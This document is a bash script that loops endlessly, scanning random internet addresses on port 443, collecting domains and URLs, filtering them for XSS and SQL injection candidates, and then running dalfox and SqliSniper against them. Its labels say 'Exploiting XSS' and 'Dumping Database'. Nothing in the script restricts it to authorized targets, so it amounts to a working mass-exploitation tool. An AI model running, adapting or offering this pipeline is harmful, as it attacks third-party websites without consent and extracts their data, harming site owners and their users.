#!/bin/bash
## colors
BOLD="\e[1m"
CYAN='\033[0;36m'
RED='\033[0;31m'
black='\033[0;30m'
green='\033[0;32m'
yellow='\033[0;33m'
magenta='\033[0;35m'
NC='\033[0m' # No Color
scan_type=$2
main_loop() {
    #trap ":" INT
    #echo "$scan_type debug"
    while true
    do
            echo -e "\n$RED${BOLD} [!]$green Scanning The Web $NC- $magenta Loop ${NC} : $CYAN${BOLD} $Counter_dub $RED${BOLD}[!]$NC$CYAN"
            python3 emap.py 443 15 ips.txt 3
            #zmap -N 15 -p 443 -o ips.txt -B 100M -i wlan0
            echo -e "$RED${BOLD} 10 Sec Sleep : needed for gdn "
            sec=10
            while [ $sec -ge 0 ]; do
                echo -ne "   Time: $sec\033[0K\r"
                let "sec=sec-1"
                sleep 1
            done
            echo -e "$magenta${BOLD} [x] Pulling domains [x]${NC}$green${BOLD}"
            cat ips.txt | gdn |awk '{print $2}' | tee output/targets.txt
            echo -e "$green Targets:"
            cat output/targets.txt
            #cat output/targets.txt | sort -u | uniq | tee output/targets.txt
            echo -e "$yellow[+] Grabbing info[+] ${NC}$magenta"
            cat output/targets.txt | anew output/raw_db.txt
            cat output/targets.txt | httpx -sc -title | anew output/database.txt
            cat ips.txt | httpx -sc -title | anew output/ip_database.txt
            echo -e "$magenta$ [+] Parsing [+] "
            cat output/database.txt | grep "200" | awk '{print $1}' | anew all.txt
            rm ips.txt
            #echo -e  "$green${BOLD} [+] Spidering [+] ${NC}"
            cat output/targets.txt | httpx -silent | hakrawler | tee spider/spidered.txt
            echo -e  "$magenta${BOLD} [+] GAU [+] ${NC}"
            cat output/targets.txt | gau --subs > spider/wayback.txt
            cat spider/wayback.txt | uro | anew spider/gau_database.txt
            echo -e "$green${BOLD} [+] Parsing [+] "
            cat spider/wayback.txt | gf xss > spider/xss.txt ### Try GAU method
            cat spider/wayback.txt | gf sqli > spider/sli.txt
            cat spider/spidered.txt | gf xss > spider/xss.txt
            cat spider/spidered.txt | gf sqli > spider/sli.txt
            cat spider/spidered.txt | anew spider/all_spidered.txt
            echo -e "$RED${BOLD} [+] GXSS [+] "
            (trap - INT; cat spider/xss.txt | gxss > spider/live-gxss.txt)
            cat spider/live-gxss.txt | anew spider/gxss.txt
            (trap - INT; cat spider/live-gxss.txt | trashcompactor > spider/live_xss.txt)
            cat spider/live_xss.txt | anew spider/swdalfox_db.txt
            Counter_dub=$[$Counter_dub +1]
            if [ "$scan_type" == "-xss" ]; then
                xss_scan
            elif [ "$scan_type" == "-db" ]; then
                db_inject
            else
                echo -e "${RED}Looping Scan ${NC}"
                main_loop
                #exit
            fi
            #(trap - INT; cat spider/live_xss.txt | dalfox pipe | anew Vuln_xss.txt)
            #rm target.txt
            #killall gdn
            echo " [!] LOOP [!] "
    done
}
xss_scan(){
        echo -e "$green${BOLD} [!]$RED Finding XSS $green[!] $RED"
        #echo -e "$yellow${BOLD} Checking Reflections With GXSS "
        #(trap - INT; cat spider/xss.txt | gxss > spider/live-gxss.txt)
        #cat spider/live-gxss.txt | anew spider/gxss.txt
        #(trap - INT; cat spider/live-gxss.txt | trashcompactor > spider/live_xss.txt)
        #cat spider/live_xss.txt | anew spider/swdalfox_db.txt
        echo -e "$green${BOLD} [!]$RED Exploiting XSS $green[!] $RED"
        cat spider/live_xss.txt | dalfox pipe | anew Vuln_xss.txt
        #Counter_dub=$[$Counter_dub +1]
        clear
        echo -e "$yellow${BOLD} [!]$green XSS Scan Done $yellow[!] ${NC}"
        main_loop

}
db_inject(){
        echo -e "$green${BOLD} [!]$CYAN Dumping Database $green[!] ${NC}"
        cat spider/sli.txt | python3 /root/eye/tools/SqliSniper/sqlisniper.py --payload /root/eye/tools/SqliSniper/payloads.txt --headers /root/eye/tools/SqliSniper/headers.txt -p -o vuln_injected.txt
        echo -e "$green${BOLD} [!]$RED Output For DB Dump Below $green[!] $RED"
        #Counter_dub=$[$Counter_dub +1]
        cat vuln_injected.txt
        clear
        main_loop

}
help() {
    echo -e "$CYAN${BOLD}Usage:${NC}"
    echo -e "${BOLD}    -help            Shows the help menu${NC}"
    echo -e "$magenta${BOLD}    -scan           Loop[emap/find webservers|katana/spider|gf/parse${NC}"
    echo -e "$RED${BOLD}    -xss           Scan the database for XSS(dalfox)${NC}"
    echo -e "$magenta${BOLD} ____________________________________________________${NC}"
    exit 0
}

if [ "$1" == "-scan" ]; then
    main_loop
elif [ "$1" == "-xss" ]; then
    xss_scan
else
    echo -e "${RED}Unknown option: $1 ${NC}"
    help
fi
